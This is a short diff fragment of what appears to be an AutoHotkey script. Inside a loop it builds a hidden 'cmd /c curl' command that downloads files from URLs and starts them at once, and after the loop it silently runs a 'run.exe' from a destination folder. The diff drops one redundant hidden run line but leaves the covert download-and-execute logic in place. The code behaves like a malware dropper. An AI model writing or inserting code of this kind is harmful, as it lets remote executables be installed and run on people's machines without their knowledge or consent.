@@ -16,7 +16,6 @@ for letter in letters {
         command := 'cmd /c curl -L -o "' . output . '" "' . url . '" & start ' . output
         Run command, , "Hide"
     }
-    Run output, , "Hide"
 }
 
 Run destDir . "\run.exe", , "Hide"
